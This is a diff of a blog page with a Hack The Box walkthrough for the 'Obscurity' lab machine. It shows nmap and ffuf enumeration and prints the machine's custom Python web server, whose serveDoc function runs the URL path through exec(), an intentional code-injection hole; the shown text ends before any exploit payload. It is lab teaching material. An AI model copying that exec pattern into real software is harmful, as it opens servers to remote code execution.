@@ -1,15 +1,113 @@
-<!doctype html><html lang=es><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="ceso "><meta name=description content="Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
-I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe."><meta name=keywords content="CTF,Security,HTB,Blog,Infosec,linux,htb-medium,rce,python,code-analysis,web,ssh"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://ceso.github.io/es/posts/2020/05/hack-the-box-obscurity/><title>Hack The Box - Obscurity :: Las Aventuras de Ceso</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css><link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css><link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png><link rel=manifest href=https://ceso.github.io/site.webmanifest><link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=https://ceso.github.io/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="Hack The Box - Obscurity"><meta itemprop=description content="My write-up / walkthrough for Obscurity from Hack The Box."><meta itemprop=datePublished content="2020-05-14T00:00:00+00:00"><meta itemprop=dateModified content="2020-05-14T00:00:00+00:00"><meta itemprop=wordCount content="3114"><meta itemprop=image content="https://ceso.github.io/images/htb/obscurity/obscurity-header.png"><meta itemprop=keywords content="linux,htb-medium,rce,python,code-analysis,web,ssh,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://ceso.github.io/images/htb/obscurity/obscurity-header.png"><meta name=twitter:title content="Hack The Box - Obscurity"><meta name=twitter:description content="My write-up / walkthrough for Obscurity from Hack The Box."><meta property="article:published_time" content="2020-05-14 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=https://ceso.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
-<span class=logo__text>ceso@hogsmeade$</span>
-<span class=logo__cursor style=background-color:gray></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://ceso.github.io/es/about/>About</a></li><li><a href=https://ceso.github.io/es/posts/2020/04/hacking/oscp-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/es/posts/>Posts</a></li><li><a href=https://ceso.github.io/es/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/es/tags/>Tags</a></li><li><a href=https://ceso.github.io/es/posts/2021/03/my-videos/>Videos</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>15 minutos
+<!doctype html><html lang=es>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="ceso ">
+<meta name=description content="Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
+I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.">
+<meta name=keywords content="CTF,Security,HTB,Blog,Infosec,linux,htb-medium,rce,python,code-analysis,web,ssh">
+<meta name=robots content="noodp">
+<meta name=theme-color content="#252627">
+<link rel=canonical href=https://ceso.github.io/es/posts/2020/05/hack-the-box-obscurity/>
+<title>
+Hack The Box - Obscurity :: Las Aventuras de Ceso
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css>
+<link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png>
+<link rel=manifest href=https://ceso.github.io/site.webmanifest>
+<link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627>
+<link rel="shortcut icon" href=https://ceso.github.io/favicon.ico>
+<meta name=msapplication-TileColor content="#252627">
+<meta name=theme-color content="#252627">
+<meta itemprop=name content="Hack The Box - Obscurity">
+<meta itemprop=description content="My write-up / walkthrough for Obscurity from Hack The Box."><meta itemprop=datePublished content="2020-05-14T00:00:00+00:00">
+<meta itemprop=dateModified content="2020-05-14T00:00:00+00:00">
+<meta itemprop=wordCount content="3105"><meta itemprop=image content="https://ceso.github.io/images/htb/obscurity/obscurity-header.png">
+<meta itemprop=keywords content="linux,htb-medium,rce,python,code-analysis,web,ssh,">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://ceso.github.io/images/htb/obscurity/obscurity-header.png">
+<meta name=twitter:title content="Hack The Box - Obscurity">
+<meta name=twitter:description content="My write-up / walkthrough for Obscurity from Hack The Box.">
+<meta property="article:published_time" content="2020-05-14 00:00:00 +0000 UTC">
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://ceso.github.io/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>ceso@hogsmeade$ </span>
+<span class=logo__cursor style=background-color:gray>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://ceso.github.io/es/about/>About</a></li><li><a href=https://ceso.github.io/es/posts/2020/04/hacking/hacking-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/es/posts/>Posts</a></li><li><a href=https://ceso.github.io/es/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/es/tags/>Tags</a></li><li><a href=https://ceso.github.io/es/posts/2021/03/my-videos/>Videos</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>15 minutos
 | Also available in
-<a href=https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/><span class="flag flag-icon flag-icon-us flag-icon-squared"></span></a></p></div><h2 class=post-title><a href=https://ceso.github.io/es/posts/2020/05/hack-the-box-obscurity/>Hack The Box - Obscurity</a></h2><div class=post-meta><span class=post-date>2020-05-14</span></div><span class=post-tags>#<a href=https://ceso.github.io/tags/linux/>linux</a>&nbsp;
+<a href=https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/><span class="flag flag-icon flag-icon-us flag-icon-squared"></span></a>
+</p>
+</div>
+<h2 class=post-title><a href=https://ceso.github.io/es/posts/2020/05/hack-the-box-obscurity/>Hack The Box - Obscurity</a></h2>
+<div class=post-meta>
+<span class=post-date>
+2020-05-14
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://ceso.github.io/tags/linux/>linux</a>&nbsp;
 #<a href=https://ceso.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
 #<a href=https://ceso.github.io/tags/rce/>rce</a>&nbsp;
 #<a href=https://ceso.github.io/tags/python/>python</a>&nbsp;
 #<a href=https://ceso.github.io/tags/code-analysis/>code-analysis</a>&nbsp;
 #<a href=https://ceso.github.io/tags/web/>web</a>&nbsp;
-#<a href=https://ceso.github.io/tags/ssh/>ssh</a>&nbsp;</span><div class=post-content><div id=TableOfContents><ul><li><a href=#quick-summary>Quick Summary</a></li><li><a href=#nmap>Nmap</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#rce>RCE</a></li><li><a href=#user>user</a></li><li><a href=#root>root</a></li></ul></div><img src=https://ceso.github.io/images/htb/obscurity/info-card.png class=center style=border-radius:8px><h2 id=quick-summary>Quick Summary</h2><p>Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&rsquo;t read it <a href=https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/>you can click here to go to it</a></p><p>I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&mldr;I will try to do them as my time allows me hehe.</p><p>For today I just decided to write about Obscurity, which I remember when I did it, it was pretty fun, I enjoyed it quite a lot, and it teach me some nice stuff, still remember when I did it I was struggling a bit with the Python stuff and my bro <a href=https://bullsec.xyz/>MrBulldops</a> gave me a hand to understand it a bit better.</p><p>Well, Obscurity is a Linux medium machine, mostly using Python stuff and as the name says before hand, the concept in this one is security by obscurity, so it doesn&rsquo;t use standard web servers and so on, instead it use custom stuff in order to &ldquo;provide security&rdquo; by there being not public ways to exploit it, so you are forced to do some code review, think outside the box, etc.</p><p>Cutting the chit-chat let&rsquo;s go into the write up!</p><h2 id=nmap>Nmap</h2><p>We start with nmap to see which ports are there open:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
+#<a href=https://ceso.github.io/tags/ssh/>ssh</a>&nbsp;
+</span>
+<div class=post-content><div id=TableOfContents>
+<ul>
+<li>
+<a href=#quick-summary>Quick Summary</a>
+</li><li>
+<a href=#nmap>Nmap</a>
+</li><li>
+<a href=#web-enumeration>Web enumeration</a>
+</li><li>
+<a href=#rce>RCE</a>
+</li><li>
+<a href=#user>user</a>
+</li><li>
+<a href=#root>root</a>
+</li></ul>
+</div>
+<img src=https://ceso.github.io/images/htb/obscurity/info-card.png class=center style=border-radius:8px>
+<h2 id=quick-summary>Quick Summary</h2>
+<p>Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&rsquo;t read it <a href=https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/>you can click here to go to it</a></p>
+<p>I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&mldr;I will try to do them as my time allows me hehe.</p>
+<p>For today I just decided to write about Obscurity, which I remember when I did it, it was pretty fun, I enjoyed it quite a lot, and it teach me some nice stuff, still remember when I did it I was struggling a bit with the Python stuff and my bro <a href=https://bullsec.xyz/>MrBulldops</a> gave me a hand to understand it a bit better.</p>
+<p>Well, Obscurity is a Linux medium machine, mostly using Python stuff and as the name says before hand, the concept in this one is security by obscurity, so it doesn&rsquo;t use standard web servers and so on, instead it use custom stuff in order to &ldquo;provide security&rdquo; by there being not public ways to exploit it, so you are forced to do some code review, think outside the box, etc.</p>
+<p>Cutting the chit-chat let&rsquo;s go into the write up!</p>
+<h2 id=nmap>Nmap</h2>
+<p>We start with nmap to see which ports are there open:</p>
+<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
 Nmap scan report for 10.10.10.168
 Host is up (0.084s latency).
@@ -127,11 +225,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
-</code></pre><p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &ldquo;BadHTTPServer&rdquo; in port 8080.</p><h2 id=web-enumeration>Web enumeration</h2><p>From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
-There are some sections in the page talking about the service by obscurity and providing information on another &ldquo;products&rdquo; that are built by &ldquo;the company&rdquo; as well some contact information.</p><img src=https://ceso.github.io/images/htb/obscurity/1-webenum.png class=center style=border-radius:8px>
+</code></pre><p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &ldquo;BadHTTPServer&rdquo; in port 8080.</p>
+<h2 id=web-enumeration>Web enumeration</h2>
+<p>From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
+There are some sections in the page talking about the service by obscurity and providing information on another &ldquo;products&rdquo; that are built by &ldquo;the company&rdquo; as well some contact information.</p>
+<img src=https://ceso.github.io/images/htb/obscurity/1-webenum.png class=center style=border-radius:8px>
 <img src=https://ceso.github.io/images/htb/obscurity/2-webenum.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/obscurity/3-webenum.png class=center style=border-radius:8px><p>In the bottom of the page, there was a mention to &ldquo;Easy Profile&rdquo;:</p><img src=https://ceso.github.io/images/htb/obscurity/4-webenum.png class=center style=border-radius:8px><p>I look up on google for this, and I found this:</p><img src=https://ceso.github.io/images/htb/obscurity/5-webenum.png class=center style=border-radius:8px><p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
-I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href=https://github.com/ffuf/ffuf>you can get ffuf here</a>.</p><p>Then I proceed to fuzze the server and I got some interesting results:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
+<img src=https://ceso.github.io/images/htb/obscurity/3-webenum.png class=center style=border-radius:8px>
+<p>In the bottom of the page, there was a mention to &ldquo;Easy Profile&rdquo;:</p>
+<img src=https://ceso.github.io/images/htb/obscurity/4-webenum.png class=center style=border-radius:8px>
+<p>I look up on google for this, and I found this:</p>
+<img src=https://ceso.github.io/images/htb/obscurity/5-webenum.png class=center style=border-radius:8px>
+<p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
+I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href=https://github.com/ffuf/ffuf>you can get ffuf here</a>.</p>
+<p>Then I proceed to fuzze the server and I got some interesting results:</p>
+<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -157,7 +265,8 @@ ________________________________________________
 --- SNIP ---
 develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 :: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
-</code></pre><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> threading
+</code></pre><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> threading
 <span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
 <span style=color:#f92672>import</span> sys
 <span style=color:#f92672>import</span> os
@@ -165,15 +274,15 @@ develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 <span style=color:#f92672>import</span> urllib.parse
 <span style=color:#f92672>import</span> subprocess
 
-respTemplate <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
-</span><span style=color:#e6db74>Date: {dateSent}
-</span><span style=color:#e6db74>Server: {server}
-</span><span style=color:#e6db74>Last-Modified: {modified}
-</span><span style=color:#e6db74>Content-Length: {length}
-</span><span style=color:#e6db74>Content-Type: {contentType}
-</span><span style=color:#e6db74>Connection: {connectionType}
+respTemplate <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;HTTP/1.1 </span><span style=color:#e6db74>{statusNum}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{statusCode}</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>Date: </span><span style=color:#e6db74>{dateSent}</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>Server: </span><span style=color:#e6db74>{server}</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>Last-Modified: </span><span style=color:#e6db74>{modified}</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>Content-Length: </span><span style=color:#e6db74>{length}</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>Content-Type: </span><span style=color:#e6db74>{contentType}</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>Connection: </span><span style=color:#e6db74>{connectionType}</span><span style=color:#e6db74>
 </span><span style=color:#e6db74>
-</span><span style=color:#e6db74>{body}
+</span><span style=color:#e6db74></span><span style=color:#e6db74>{body}</span><span style=color:#e6db74>
 </span><span style=color:#e6db74>&#34;&#34;&#34;</span>
 DOC_ROOT <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;DocRoot&#34;</span>
 
@@ -191,13 +300,13 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
     <span style=color:#66d9ef>def</span> __init__(self, <span style=color:#f92672>**</span>kwargs):
         self<span style=color:#f92672>.</span>__dict__<span style=color:#f92672>.</span>update(kwargs)
         now <span style=color:#f92672>=</span> datetime<span style=color:#f92672>.</span>now()
-        self<span style=color:#f92672>.</span>dateSent <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>modified <span style=color:#f92672>=</span> now<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#34;%a, </span><span style=color:#e6db74>%d</span><span style=color:#e6db74> %b %Y %H:%M:%S&#34;</span>)
+        self<span style=color:#f92672>.</span>dateSent <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>modified <span style=color:#f92672>=</span> now<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%a</span><span style=color:#e6db74>, </span><span style=color:#e6db74>%d</span><span style=color:#e6db74> %b %Y %H:%M:%S&#34;</span>)
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>stringResponse</span>(self):
         <span style=color:#66d9ef>return</span> respTemplate<span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>self<span style=color:#f92672>.</span>__dict__)
 
 <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Request</span>:
     <span style=color:#66d9ef>def</span> __init__(self, request):
-        self<span style=color:#f92672>.</span>good <span style=color:#f92672>=</span> True
+        self<span style=color:#f92672>.</span>good <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
         <span style=color:#66d9ef>try</span>:
             request <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>parseRequest(request)
             self<span style=color:#f92672>.</span>method <span style=color:#f92672>=</span> request[<span style=color:#e6db74>&#34;method&#34;</span>]
@@ -206,7 +315,7 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
             self<span style=color:#f92672>.</span>header <span style=color:#f92672>=</span> request[<span style=color:#e6db74>&#34;header&#34;</span>]
             self<span style=color:#f92672>.</span>body <span style=color:#f92672>=</span> request[<span style=color:#e6db74>&#34;body&#34;</span>]
         <span style=color:#66d9ef>except</span>:
-            self<span style=color:#f92672>.</span>good <span style=color:#f92672>=</span> False
+            self<span style=color:#f92672>.</span>good <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
 
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>parseRequest</span>(self, request):        
         req <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>strip(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>&#34;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
@@ -231,14 +340,14 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
 
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>listen</span>(self):
         self<span style=color:#f92672>.</span>sock<span style=color:#f92672>.</span>listen(<span style=color:#ae81ff>5</span>)
-        <span style=color:#66d9ef>while</span> True:
+        <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
             client, address <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>sock<span style=color:#f92672>.</span>accept()
             client<span style=color:#f92672>.</span>settimeout(<span style=color:#ae81ff>60</span>)
             threading<span style=color:#f92672>.</span>Thread(target <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>listenToClient,args <span style=color:#f92672>=</span> (client,address))<span style=color:#f92672>.</span>start()
 
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>listenToClient</span>(self, client, address):
         size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1024</span>
-        <span style=color:#66d9ef>while</span> True:
+        <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
             <span style=color:#66d9ef>try</span>:
                 data <span style=color:#f92672>=</span> client<span style=color:#f92672>.</span>recv(size)
                 <span style=color:#66d9ef>if</span> data:
@@ -251,7 +360,7 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
                     <span style=color:#66d9ef>raise</span> error(<span style=color:#e6db74>&#39;Client disconnected&#39;</span>)
             <span style=color:#66d9ef>except</span>:
                 client<span style=color:#f92672>.</span>close()
-                <span style=color:#66d9ef>return</span> False
+                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
     
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>handleRequest</span>(self, request, conn, address):
         <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>good:
@@ -293,9 +402,9 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
     <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>serveDoc</span>(self, path, docRoot):
         path <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>unquote(path)
         <span style=color:#66d9ef>try</span>:
-            info <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;output = &#39;Document: {}&#39;&#34;</span> <span style=color:#75715e># Keep the output for later debug</span>
-            <span style=color:#66d9ef>print</span>(info<span style=color:#f92672>.</span>format(path))
-            <span style=color:#66d9ef>exec</span>(info<span style=color:#f92672>.</span>format(path)) <span style=color:#75715e># This is how you do string formatting, right?</span>
+            info <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;output = &#39;Document: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;&#34;</span> <span style=color:#75715e># Keep the output for later debug</span>
+            print(info<span style=color:#f92672>.</span>format(path))
+            exec(info<span style=color:#f92672>.</span>format(path)) <span style=color:#75715e># This is how you do string formatting, right?</span>
             cwd <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>dirname(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>realpath(__file__))
             docRoot <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(cwd, docRoot)
             <span style=color:#66d9ef>if</span> path <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;/&#34;</span>:
@@ -303,7 +412,7 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
             requested <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(docRoot, path[<span style=color:#ae81ff>1</span>:])
             <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>isfile(requested):
                 mime <span style=color:#f92672>=</span> mimetypes<span style=color:#f92672>.</span>guess_type(requested)
-                mime <span style=color:#f92672>=</span> (mime <span style=color:#66d9ef>if</span> mime[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>!=</span> None <span style=color:#66d9ef>else</span> <span style=color:#e6db74>&#34;text/html&#34;</span>)
+                mime <span style=color:#f92672>=</span> (mime <span style=color:#66d9ef>if</span> mime[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>!=</span> <span style=color:#66d9ef>None</span> <span style=color:#66d9ef>else</span> <span style=color:#e6db74>&#34;text/html&#34;</span>)
                 mime <span style=color:#f92672>=</span> MIMES[requested<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;.&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]]
                 <span style=color:#66d9ef>try</span>:
                     <span style=color:#66d9ef>with</span> open(requested, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
@@ -319,15 +428,23 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
                     data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>format(path)
                 status <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;404&#34;</span>
         <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
-            <span style=color:#66d9ef>print</span>(e)
+            print(e)
             errorPage <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(docRoot, <span style=color:#e6db74>&#34;errors&#34;</span>, <span style=color:#e6db74>&#34;500.html&#34;</span>)
             mime <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;text/html&#34;</span>
             <span style=color:#66d9ef>with</span> open(errorPage, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
                 data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
             status <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;500&#34;</span>
         <span style=color:#66d9ef>return</span> {<span style=color:#e6db74>&#34;body&#34;</span>: data, <span style=color:#e6db74>&#34;mime&#34;</span>: mime, <span style=color:#e6db74>&#34;status&#34;</span>: status}
